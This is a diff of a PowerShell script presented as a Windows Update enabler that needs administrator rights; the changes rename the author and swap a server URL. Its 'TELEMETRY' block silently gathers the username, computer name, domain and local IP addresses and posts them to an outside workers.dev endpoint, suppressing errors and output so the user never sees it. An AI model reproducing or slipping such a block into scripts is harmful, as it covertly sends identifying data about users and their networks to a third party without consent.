@@ -1,8 +1,8 @@
-# ============================================================
+﻿# ============================================================
 # Full Windows Update Enable Script (PowerShell)
 # Works on Windows 10 / 11
 # Requires Administrator Privileges
-# Created By rhshourav V1.3.0 (PS Conversion)
+# Created By shouravx V1.3.0 (PS Conversion)
 # ============================================================
 # ================================================================
 #  TELEMETRY
@@ -21,7 +21,7 @@ try {
         text  = "Enable Windows Update v1.3.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 # =======================
